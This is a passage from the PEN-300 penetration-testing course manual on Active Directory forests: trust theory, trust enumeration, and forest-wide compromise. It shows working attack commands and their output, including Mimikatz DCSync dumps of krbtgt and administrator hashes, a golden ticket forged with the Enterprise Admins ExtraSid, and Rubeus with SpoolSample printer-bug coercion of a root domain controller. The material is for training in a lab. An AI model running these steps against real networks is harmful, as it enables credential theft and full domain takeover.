administrator user, after which it is injected into memory. 
To check the success of this attack, we’ll first dump any loaded Kerberos tickets with klist: 
PS C:\tools> klist 
 
Current LogonId is 0:0x58e86 
 
Cached Tickets: (1) 
 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
638 
#0>     Client: administrator @ PROD.CORP1.COM 
        Server: CIFS/appsrv01.prod.corp1.com @ PROD.CORP1.COM 
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate 
name_canonicalize 
        Start Time: 4/15/2020 11:43:27 (local) 
        End Time:   4/15/2020 21:43:27 (local) 
        Renew Time: 4/22/2020 11:43:27 (local) 
        Session Key Type: AES-128-CTS-HMAC-SHA1-96 
        Cache Flags: 0 
        Kdc Called: 
Listing 829 - Listing the service ticket to CIFS on APPSRV01 
Now that we have a TGS for the CIFS service on appsrv01 as administrator, we can interact with 
file services on appsrv01 in the context of the administrator domain admin user: 
PS C:\tools> dir \\appsrv01.prod.corp1.com\c$ 
 
    Directory: \\appsrv01.prod.corp1.com\c$ 
 
Mode                LastWriteTime         Length Name 
----                -------------         ------ ---- 
d-----         4/3/2020   7:17 AM                inetpub 
d-----        7/16/2016   6:23 AM                PerfLogs 
d-r---        4/14/2020   8:12 AM                Program Files 
d-----        7/16/2016   6:23 AM                Program Files (x86) 
d-----        4/14/2020   8:13 AM                Tools 
d-r---         4/3/2020   2:07 PM                Users 
d-----         4/4/2020  10:31 AM                Windows 
Listing 830 - Verify CIFS access on APPSRV01 
Our access to appsrv01 is in the context of the administrator domain admin user. We can use our 
CIFS access to obtain code execution on appsrv01, but in the process we will perform a network 
login instead of an interactive login. This means our access will be limited to appsrv01 and 
cannot directly be used to expand access towards the rest of the domain. 
16.2.4.1 Exercises 
1. 
Repeat the enumeration steps detailed in this section to discover the GenericWrite access to 
appsrv01. 
2. 
Implement the attack to gain a CIFS service ticket to appsrv01 by creating a new computer 
account object and use that with Rubeus. Be sure to reboot appsrv01 to clear any cached 
Kerberos tickets before starting the attack 
3. 
Leverage the CIFS TGS to get code execution on appsrv01. 
16.3 Active Directory Forest Theory 
Up to this point, we have only discussed and worked with Active Directory concepts that use a 
single domain. In larger organizations and corporations, the infrastructure is split into multiple 
domains but still managed by Active Directory. When we perform penetration tests against multi-
domain infrastructures, we must obviously assess the security posture of all domains. Given the 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
639 
importance of this, we will spend the remainder of this module discussing, enumerating, and 
exploiting design concepts for multi-domain Active Directory implementations. 
16.3.1 
Active Directory Trust in a Forest 
To begin, we’ll discuss the underlying theory of multi-domain Active Directory implementations. 
This will form a foundation for later enumeration and subsequent attacks. 
The main concept we’ll focus on is trust, which allows two or more domains to extend Kerberos 
authentication to each other. 
For example, imagine the two domains, A and B, as illustrated in Figure 245. Domain A trusts 
Domain B, which means users of Domain B are able to access resources inside Domain A. 
 
Figure 245: Trust from Domain A to Domain B 
The combination of Kerberos authentication and trust makes it possible to assign permissions to 
users in Domain B so that they can access services, like files and shares, inside Domain A. This 
allows distribution of users, data, and services across multiple domains. 
Figure 245 shows trust from Domain A to Domain B, which is called a one-way trust but trust can 
also be configured from Domain B to Domain A, which results in a two-way or bi-directional trust. 
When trust is established, a TGT created in Domain B is usable in Domain A because the domain 
controller in Domain A trusts the domain controller in Domain B. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
640 
An Active Directory Forest,986 essentially a parent container for a number of domains, helps 
organize domain structures and allows for many different design configurations. The first 
configuration we’ll discuss is a domain tree, which is illustrated in Figure 246. 
 
Figure 246: Domain tree with three domains 
In this example, the Corp.com root domain has a bi-directional trust to the Prod.Corp.com child 
domain. This is configured by default in Active Directory and is known as parent-child trust. 
Likewise, a parent-child trust exists between Prod.Corp.com and Factory.Prod.Corp.com. 
Parent-child trust is transitive, which means that since Corp.com trusts Prod.Corp.com, and 
Prod.Corp.com trusts Factory.Prod.Corp.com, then by extension, Corp.com also trusts 
Factory.Prod.Corp.com. 
A forest can contain multiple trees and each tree can contain branches, which leads to a 
multitude of possible configurations. One such configuration is illustrated in Figure 247. 
 
986 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/ad/forests 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
641 
 
Figure 247: Domain tree with branches 
Due to the transitivity in parent-child trust, FactoryB.Prod.Corp.com trusts Dev.Corp.com but the 
authentication path has to go through both Prod.Corp.com and Corp.com, which will slow 
authentication. 
To improve efficiency, a shortcut trust can be established (indicated in Figure 247) between 
FactoryB.Prod.Corp.com and Dev.Corp.com. This type of trust is also transitive and can occur 
between two domains organized within the same or separate trees. 
Many organizations choose to design and structure their Active Directory infrastructure in 
multiple domains to split apart services from major business units and make them more 
transparent for system administrators. As penetration testers, we must analyze the trust between 
these domains to uncover potential attack vectors. 
Each of the domains in a forest operates as a single unit and have all the built-in groups and 
users we know from a single domain design. However, the Enterprise Admins group987 is an 
extremely powerful group that only exists in the root domain. 
Members of the Domain Admins group have full control over a specific domain, but their 
administrative access does not extend beyond that domain. Members of the Enterprise Admins 
group are automatically a domain administrator in every domain in the forest, which makes them 
a very desirable target. 
 
987 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-
2012/dn579255(v=ws.11)?redirectedfrom=MSDN 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
642 
However, gaining Domain or Enterprise Admin access is not often the ultimate goal of a 
penetration test. But this level of access more or less ensures that we will be able to fulfill the 
actual goals of the penetration test. 
In the next section, we are going to examine the enumeration of existing trusts. We will also 
perform enumeration of users and groups located in trusted domains. 
16.3.2 
Enumeration in the Forest 
As penetration testers, we often get access to (or compromise) a client or server inside an Active 
Directory instance. From there, enumeration focusing on AD domain trusts is a key step of the 
assessment. With this in mind, let’s discuss how to do that. 
In general, our first goal is to determine if the domain we have compromised is part of a larger 
Active Directory infrastructure, and if it is, we should enumerate available trusts. 
There are multiple ways to do this. The “old school” approach is to use the built-in nltest.exe988 
application. We can use the /trusted_domains flag to enumerate any domains trusted by our 
current domain. 
Listing 831 shows this in the context of the Offsec user from the Windows 10 client machine. 
C:\tools> nltest /trusted_domains 
List of domain trusts: 
    0: CORP1 corp1.com (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( 
Attr: withinforest ) 
    1: PROD prod.corp1.com (NT 5) (Forest: 0) (Primary Domain) (Native) 
The command completed successfully 
Listing 831 - Enumerating trust with nltest 
The output reveals our current domain (prod.corp1.com) as indicated by the Primary Domain 
note. Additionally, we find the separate domain (corp1.com). The highlighted area indicates three 
important pieces of information. 
First, this is the Forest Tree Root, meaning this is the root domain inside the forest. Secondly, 
Direct Outbound and Direct Inbound indicate that our current domain has a direct bi-directional 
trust to it. Finally, the name of the root domain is listed as corp1.com. 
Instead of using the nltest command line utility, we can also enumerate this information with 
.NET, with Win32 APIs, or with LDAP. They each return slightly different details about the trust and 
output different formats. 
The easiest to implement is .NET through the Domain.GetAllTrustRelationships989 method of the 
System.DirectoryServices.ActiveDirectory.Domain namespace: 
PS C:\tools> 
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRel
ationships() 
 
988 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-
2012/cc731935(v=ws.11) 
989 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.directoryservices.activedirectory.domain.getalltrustrelationships?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
643 
 
SourceName     TargetName   TrustType TrustDirection 
----------     ----------   --------- -------------- 
prod.corp1.com corp1.com  ParentChild  Bidirectional 
Listing 832 - Enumerating domain trust with .NET 
The .NET method gives us the information that our current domain (prod.corp1.com) has a 
parent-child domain trust that is bi-directional to corp1.com. 
We can also use the Win32 DsEnumerateDomainTrusts990 API. As previously mentioned, calling 
Win32 APIs from PowerShell or C# requires some setting up, so we are going to use an existing 
implementation in PowerView through the Get-DomainTrust method. 
By specifying the -API flag, Get-DomainTrust will enumerate domain trust using 
DsEnumerateDomainTrusts: 
Get-DomainTrust will use the .NET method if we specify the -NET flag. 
PS C:\tools> Get-DomainTrust -API 
 
SourceName        : PROD.CORP1.COM 
TargetName        : corp1.com 
TargetNetbiosName : CORP1 
Flags             : IN_FOREST, DIRECT_OUTBOUND, TREE_ROOT, DIRECT_INBOUND 
ParentIndex       : 0 
TrustType         : UPLEVEL 
TrustAttributes   : WITHIN_FOREST 
TargetSid         : S-1-5-21-1095350385-1831131555-2412080359 
TargetGuid        : b3ddeaea-6e94-430f-acaa-625e35787ee0 
 
SourceName        : PROD.CORP1.COM 
TargetName        : prod.corp1.com 
TargetNetbiosName : PROD 
Flags             : IN_FOREST, PRIMARY, NATIVE_MODE 
ParentIndex       : 0 
TrustType         : UPLEVEL 
TrustAttributes   : 0 
TargetSid         : S-1-5-21-3776646582-2086779273-4091361643 
TargetGuid        : ad933000-76e3-4db0-b43c-6a86b850e21e 
Listing 833 - Enumerating domain trust with DsEnumerateDomainTrusts 
This output also indicates that prod.corp1.com has a direct bi-directional trust to corp1.com. 
It is worth noting that if corp1.com had not been the tree root, we could continue the enumeration 
by listing all domain trusts for corp1.com through the -Domain option in Get-DomainTrust. 
Using this approach, we could map out all the available trust relationships inside the forest. 
 
990 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/dsgetdc/nf-dsgetdc-dsenumeratedomaintrustsa 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
644 
Finally, since a domain trust creates a Trusted Domain Object (TDO),991 we can query its 
properties with LDAP. 
For example, we can use Get-DomainTrust to make this LDAP query as shown in Listing 833. 
PS C:\tools> Get-DomainTrust 
 
SourceName      : prod.corp1.com 
TargetName      : corp1.com 
TrustType       : WINDOWS_ACTIVE_DIRECTORY 
TrustAttributes : WITHIN_FOREST 
TrustDirection  : Bidirectional 
WhenCreated     : 4/2/2020 2:08:22 PM 
WhenChanged     : 4/2/2020 2:08:22 PM 
Listing 834 - Enumerating domain trust with LDAP 
Again, the output generates similar results as the previous tools, in a different format. 
Once we have gathered information about the domain trust, we can enumerate users, groups, and 
services in trusted domains with relatively standard tools. 
The .NET DirectorySearcher992 class, which can perform LDAP queries, can be initialized with a 
DirectoryEntry993 object. This DirectoryEntry object in turn is created based on the LDAP path of 
the domain controller to query. 
If a domain controller in a trusted domain is used, like rdc01 instead of cdc01 in the current 
domain, then we can execute LDAP queries in any trusted domain. This allows us to reuse the 
same techniques across the entire forest. 
PowerView implements this through the -Domain option on many of its commands. Listing 835 
shows a truncated enumeration of users in the trusted corp1.com domain: 
PS C:\tools> Get-DomainUser -Domain corp1.com 
 
logoncount             : 42 
badpasswordtime        : 4/2/2020 6:52:50 AM 
description            : Built-in account for administering the computer/domain 
distinguishedname      : CN=Administrator,CN=Users,DC=corp1,DC=com 
objectclass            : {top, person, organizationalPerson, user} 
lastlogontimestamp     : 4/2/2020 6:52:54 AM 
name                   : Administrator 
objectsid              : S-1-5-21-1095350385-1831131555-2412080359-500 
samaccountname         : Administrator 
admincount             : 1 
codepage               : 0 
samaccounttype         : USER_OBJECT 
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=corp1,DC=com 
dscorepropagationdata  : {4/2/2020 2:02:14 PM, 4/2/2020 2:02:14 PM, 4/2/2020 1:47:05 
 
991 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/adschema/c-trusteddomain 
992 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directorysearcher?view=netframework-
4.8 
993 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
645 
PM, 1/1/1601 6:12:16 PM} 
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=corp1,DC=com, 
CN=Domain 
                         Admins,CN=Users,DC=corp1,DC=com, CN=Enterprise 
Admins,CN=Users,DC=corp1,DC=com..}    
... 
Listing 835 - Enumerating users in corp1.com 
The output of the Get-DomainUser method indicates that the Administrator user is a member of 
the Enterprise Admins group in the corp1.com domain. 
It’s also worth noting that the BloodHound Ingestor works with domain trust and 
allows enumeration of the entire forest. 
We can enumerate domain trust across the forest with the enumeration techniques shown in this 
section. We can also perform user, group, and Kerberos delegation enumeration in trusted 
domains and perhaps leverage the results in an attack. 
In the next section, we will focus on leveraging domain trust to compromise other domains or the 
entire forest. 
16.3.2.1 Exercises 
1. 
Enumerate domain trust with .NET, Win32 API, and LDAP. 
2. 
Enumerate trusts from the corp1.com domain. 
3. 
Enumerate groups in the corp1.com domain. 
4. 
Find all members of the Enterprise Admins group. 
16.4 Burning Down the Forest 
During a penetration test, it is often beneficial to demonstrate a forest compromise as an ultimate 
illustration of design vulnerability. 
We will take two approaches to this in the following sections. We will leverage a compromised 
domain admin account in a child domain and we will leverage unconstrained Kerberos delegation. 
16.4.1 
Owning the Forest with Extra SIDs 
In the context of an Active Directory forest, our ultimate goal is to escalate our privileges from 
domain admin of one domain to Enterprise admin. The most direct way to obtain this is to 
compromise the root domain and obtain Enterprise Admin group membership. 
To that end, in this section we will leverage extra SIDs, a field inside a TGT or TGS. Although this 
attack assumes we have compromised the domain we currently reside in, it paves the way to 
total forest compromise. 
Before we begin, let’s highlight a few details of the Kerberos protocol. When the user performs a 
logon authentication, a TGT is created by the domain controller and is encrypted with the krbtgt 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
646 
account password hash. This is what we leverage when we create a golden ticket to obtain 
unlimited access and persistence in the domain. 
The user’s logon and authorization information is stored within a structure called 
KERB_VALIDATION_INFO994 inside the TGT. Among other things, this structure contains a list of 
group memberships identified by SIDs. 
When we craft a golden ticket, we create a TGT with our desired group membership. The 
ExtraSids field within the KERB_VALIDATION_INFO structure includes SIDs that originate in a 
foreign domain and show membership in a trusted domain. 
ExtraSids can be used during Active Directory domain migrations to grant access from one 
domain to another. 
In a legitimate use case, a user from Domain A with ExtraSids assigned from Domain B is able to 
access content inside the trusted domain according to the group memberships the ExtraSids 
translate to. 
The technical implementation of Kerberos authentication across domains depends on the trust 
key. Since Domain B cannot know the password hash of Domain A, it has no way of decrypting a 
TGT sent from Domain A to Domain B. A shared secret, created when the trust is configured, 
solves this. 
When the domain trust is established, a new computer account with the name of the trusted 
domain is also created. In prod.corp1.com, the computer account is called corp1$, which is also 
referred to as the trust account. The shared secret is the password hash of corp1$. 
For a bi-directional trust like that of parent and child domains, both prod.corp1.com and 
corp1.com create the trust account. The name of the account is always the same as the trusted 
domain, so inside corp1.com it is called prod$, but both prod$ and corp1$ have the same 
password hash. 
We can obtain the NTLM hash of the trust account from the domain controller, just as we did with 
the krbtgt account. 
Consider the dcsync query run as the admin domain administrator user shown in Listing 836: 
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:corp1$ 
[DC] 'prod.corp1.com' will be the domain 
[DC] 'CDC01.prod.corp1.com' will be the DC server 
[DC] 'corp1$' will be the user account 
 
Object RDN           : CORP1$ 
 
** SAM ACCOUNT ** 
 
SAM Username         : CORP1$ 
Account Type         : 30000002 ( TRUST_ACCOUNT ) 
User Account Control : 00000820 ( PASSWD_NOTREQD INTERDOMAIN_TRUST_ACCOUNT ) 
Account expiration   : 
 
994 (Microsoft, 2019), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/69e86ccc-85e3-41b9-b514-
7d969cd0ed73?redirectedfrom=MSDN 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
647 
Password last change : 4/2/2020 7:19:14 AM 
Object Security ID   : S-1-5-21-3776646582-2086779273-4091361643-1103 
Object Relative ID   : 1103 
 
Credentials: 
  Hash NTLM: cf4bc17dff896101da4f3498a68d50f2 
... 
Listing 836 - Trust key for CORP1$ 
If a user in prod.corp1.com wants to access a service in corp1.com, the domain controller in 
prod.corp1.com will create a TGT for corp1.com and indicate that it’s a referral to a TGS. This 
TGT is not signed by the krbtgt password hash but instead with the trust key shown in Listing 
836. 
To illustrate this process, we can attempt to access the CIFS service of rdc01.corp1.com as the 
Offsec user on the Windows 10 client inside the prod.corp1.com domain. This will fail since the 
Offsec user is not a local administrator on rdc01.corp1.com, but the tickets will be generated 
regardless. 
Note that before executing this, we should log out and log back in to clear all cached Kerberos 
tickets. 
C:\tools> dir \\rdc01.corp1.com\c$ 
Access is denied. 
 
C:\tools> klist 
 
Current LogonId is 0:0x54243a 
 
Cached Tickets: (3) 
 
#0>     Client: offsec @ PROD.CORP1.COM 
        Server: krbtgt/CORP1.COM @ PROD.CORP1.COM 
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT) 
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate 
name_canonicalize 
        ... 
        Cache Flags: 0 
        Kdc Called: CDC01.prod.corp1.com 
 
#1>     Client: offsec @ PROD.CORP1.COM 
        Server: krbtgt/PROD.CORP1.COM @ PROD.CORP1.COM 
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent 
name_canonicalize 
        ... 
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: CDC01.prod.corp1.com 
 
#2>     Client: offsec @ PROD.CORP1.COM 
        Server: CIFS/rdc01.corp1.com @ CORP1.COM 
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate 
name_canonicalize 
        ... 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
648 
        Cache Flags: 0 
        Kdc Called: RDC01.corp1.com 
Listing 837 - Tickets requested for cross domain authentication 
Our access to the file share on rdc01.corp1.com is denied, but the klist command shows that 
Kerberos tickets were requested. Ticket 1 is a TGT for the prod.corp1.com domain. This is our 
regular TGT and is encrypted with the krbtgt hash of our current domain. 
Ticket 0 is a TGT for the corp1.com domain but it is still generated by the domain controller in our 
current domain. This TGT is encrypted by the trust key and then forwarded to the domain 
controller in corp1.com. 
Finally, ticket 2 is a TGS for the CIFS service on rdc01.corp1.com, which is created by the domain 
controller in corp1.com and returned to us. 
While this trust key seems very useful from an attacker’s viewpoint, we don’t actually need to use 
it at all. If we compromise the krbtgt account password of our current domain, we can craft a 
golden ticket that contains an ExtraSid with group membership of Enterprise Admins. 
This golden ticket will get rewritten by the domain controller in the current domain with the trust 
key before going to the parent domain, which was demonstrated in Listing 837. 
No matter which password we use for the golden ticket, this technique will allow us to jump 
directly from our current domain to the root domain as a member of Enterprise Admins, 
effectively making us Domain Admins in all domains in the forest. 
Let’s try this out with Mimikatz. 
First, we’ll open a command prompt as the admin user, which is a member of the Domain Admins 
group in prod.corp1.com. This will simulate our compromise of the domain and allow us to obtain 
the krbtgt password hash. 
We’ll launch mimikatz and use the dcsync command to force a replication of the password hash 
for the krbtgt account: 
mimikatz # lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt 
[DC] 'prod.corp1.com' will be the domain 
[DC] 'CDC01.prod.corp1.com' will be the DC server 
[DC] 'prod\krbtgt' will be the user account 
 
Object RDN           : krbtgt 
 
** SAM ACCOUNT ** 
 
SAM Username         : krbtgt 
Account Type         : 30000000 ( USER_OBJECT ) 
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT ) 
Account expiration   : 
Password last change : 4/2/2020 7:09:13 AM 
Object Security ID   : S-1-5-21-3776646582-2086779273-4091361643-502 
Object Relative ID   : 502 
 
Credentials: 
  Hash NTLM: 4b6af2bf64714682eeef64f516a08949 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
649 
    ntlm- 0: 4b6af2bf64714682eeef64f516a08949 
    lm  - 0: 2342ac3fd35afd0223a1469f0afce2b1 
... 
Listing 838 - Obtaining krbtgt hash with DCSync 
With the NTLM hash for the krbtgt account from prod.corp1.com, we can create a golden ticket. 
As part of the kerberos::golden command’s arguments, we will need the domain SID for both 
domains. We can obtain these with Get-DomainSID from PowerView: 
PS C:\tools> Get-DomainSID -Domain prod.corp1.com 
S-1-5-21-3776646582-2086779273-4091361643 
 
PS C:\tools> Get-DomainSid -Domain corp1.com 
S-1-5-21-1095350385-1831131555-2412080359 
Listing 839 - Finding domain SIDs 
The final piece of information we need is the RID of the Enterprise Admins group. Luckily, this is a 
static value of 519.995 This means we can append the value “519” to the domain SID to obtain the 
SID of the Enterprise Admins group. 
Now we are ready to craft the golden ticket that will grant us Enterprise Admin membership in 
corp1.com. We’ll supply the username inside prod.corp1.com (which does not have to be valid), 
the origin domain (/domain), the origin domain SID (/sid), the krbtgt password hash (/krbtgt), 
and finally, the ExtraSid value (Enterprise Admins SID) through the /sids: option. 
We’ll also supply the /ptt flag to inject the ticket into memory: 
mimikatz # kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-
2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-
1095350385-1831131555-2412080359-519 /ptt 
User      : h4x 
Domain    : prod.corp1.com (PROD) 
SID       : S-1-5-21-3776646582-2086779273-4091361643 
User Id   : 500 
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-1095350385-1831131555-2412080359-519 ; 
ServiceKey: 4b6af2bf64714682eeef64f516a08949 - rc4_hmac_nt 
Lifetime  : 4/16/2020 8:23:43 AM ; 4/14/2030 8:23:43 AM ; 4/14/2030 8:23:43 AM 
-> Ticket : ** Pass The Ticket ** 
 
 * PAC generated 
 * PAC signed 
 * EncTicketPart generated 
 * EncTicketPart encrypted 
 * KrbCred generated 
 
Golden ticket for 'h4x @ prod.corp1.com' successfully submitted for current session 
Listing 840 - Crafting a golden ticket with ExtraSid 
After the ticket is generated and injected into memory, we can exit Mimikatz to prove our access 
to rdc01 (the root domain controller) with PsExec: 
 
995 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
650 
C:\tools> c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd 
... 
 
Microsoft Windows [Version 10.0.17763.737] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> 
Listing 841 - Getting code execution on RDC01 
We were able to obtain code execution, which proves administrative access to rdc01. We can list 
the group memberships with whoami /groups: 
C:\Windows\system32> whoami /groups 
 
GROUP INFORMATION 
----------------- 
 
Group Name                                   Type                
============================================ ================  
Everyone                                     Well-known group                                       
... 
PROD\Domain Admins                           Group             
PROD\Group Policy Creator Owners             Group             
                                             Unknown SID type  
                                             Unknown SID type  
CORP1\Enterprise Admins                     Group             
...                 
Listing 842 - Listing group membership 
We are now a member of Enterprise Admins. Excellent! 
This proves that compromise of one domain can lead to the compromise od every single domain 
in the forest. However, since Microsoft has stated that domains are not security boundaries, this 
“compromise” is actually allowed by design. Practically though, this can create secure design 
challenges for organizations that wish to compartmentalize data and access. 
A simple example is creating a DMZ with Internet-facing web servers and joining them to a 
domain that is in the same forest as the production domain. 
ExtraSids can be blocked between domains in the same forest with domain 
quarantine which can be configured with the Netdom996 tool. However, this also 
blocks legitimate access so this solution is rarely implemented. 
16.4.1.1 Exercise 
1. 
Repeat the steps in this section to obtain code execution on the root domain controller. 
 
996 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-
2012/cc772217(v=ws.11) 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
651 
16.4.1.2 Extra Mile 
Find the trust key for corp1.com and use it to craft a golden ticket instead of the krbtgt password 
hash as shown in the previous section. 
Obtain code execution on the rdc01.corp1.com domain controller with the crafted ticket. Be sure 
to log off between attempts to clear out any cached tickets. 
16.4.2 
Owning the Forest with Printers 
In a previous section, we demonstrated how to compromise an entire domain using the printer 
bug after compromising a single server configured with unconstrained Kerberos delegation. In 
this section, we’ll reuse this technique to directly target a domain controller in the forest root 
domain and instantly compromise the entire forest from a single server. 
This technique does not require Domain Admin privileges. However, if we have Domain Admin 
privileges and no servers with unconstrained delegation exist in our current domain, we can 
create one ourselves by modifying the configuration of one of the servers. 
In this section, we’ll implement the attack without Domain Admin privileges. To do this, we’ll first 
log in to appsrv01 as the Offsec user and open a PowerShell prompt. From here, we can 
determine our access to the print spooler service on the rdc01 root domain controller: 
PS C:\Tools> ls \\rdc01\pipe\spoolss 
 
    Directory: \\rdc01\pipe 
 
Mode                LastWriteTime         Length Name 
----                -------------         ------ ---- 
                                                 spoolss 
Listing 843 - Testing access to print spooler service on RDC01 
Listing 843 shows our access to the print spooler service on rdc01 from the prod.corp1.com 
domain. This means we can use the RpcRemoteFindFirstPrinterChangeNotification API to force 
an authentication and allow us to obtain a forwardable TGT. 
We’ll repeat our actions from the previous section by opening an administrative command 
prompt and then use Rubeus to monitor for new tickets from the root domain controller machine 
account: 
C:\Tools> Rubeus.exe monitor /interval:5 /filteruser:RDC01$ 
... 
 
[*] Action: TGT Monitoring 
[*] Target user     : RDC01$ 
[*] Monitoring every 5 seconds for new TGTs 
Listing 844 - Monitoring for TGTs 
With Rubeus running, we’ll switch back to our PowerShell prompt and launch SpoolSample to 
force the print change notification from rdc01: 
PS C:\Tools> .\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com 
[+] Converted DLL to shellcode 
[+] Executing RDI 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
652 
[+] Calling exported function 
TargetServer: \\rdc01.corp1.com, CaptureServer: \\appsrv01.prod.corp1.com 
Attempted printer notification and received an invalid handle. The coerced 
authentication probably worked! 
Listing 845 - Forcing authentication from print spooler service 
After receiving the success message shown in Listing 845, we’ll switch back to our Rubeus 
monitor, and after a few seconds, the new TGT is displayed. 
[*] 4/17/2020 1:55:43 PM UTC - Found new TGT: 
 
  User                  :  RDC01$@CORP1.COM 
  StartTime             :  4/16/2020 10:10:04 PM 
  EndTime               :  4/17/2020 8:10:04 AM 
  RenewTill             :  4/20/2020 8:30:42 AM 
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, 
forwardable 
  Base64EncodedTicket   : 
 
    doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+... 
 
[*] Ticket cache size: 1 
Listing 846 - TGT received from RDC01 
Now that we have obtained a forwardable TGT for the root domain controller machine account, 
we can use Rubeus to inject it into memory as shown in Listing 847. 
C:\Tools> Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+... 
... 
 
[*] Action: Import Ticket 
[+] Ticket successfully imported! 
Listing 847 - Injecting the TGT into memory 
The root domain controller computer account is not a local administrator on rdc01, so we cannot 
directly obtain code execution. However, a domain controller computer account has the access 
right to perform AD replication. 
We can exploit this by forcing a replication with Mimikatz dcsync: 
mimikatz # lsadump::dcsync /domain:corp1.com /user:corp1\administrator 
[DC] 'corp1.com' will be the domain 
[DC] 'RDC01.corp1.com' will be the DC server 
[DC] 'corp1\administrator' will be the user account 
 
Object RDN           : Administrator 
 
** SAM ACCOUNT ** 
 
SAM Username         : Administrator 
Account Type         : 30000000 ( USER_OBJECT ) 
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD ) 
Account expiration   : 
Password last change : 4/2/2020 7:03:40 AM 
Object Security ID   : S-1-5-21-1095350385-1831131555-2412080359-500 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
653 
Object Relative ID   : 500 
 
Credentials: 
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e 
    ntlm- 0: 2892d26cdf84d7a70e2eb3b9f05c425e 
    ntlm- 1: e2b475c11da2a0748290d87aa966c327 
    lm  - 0: 52d8a096001c4c402c9e7b00cae2ee9b 
... 
Listing 848 - Getting the NTLM hash with DCSync 
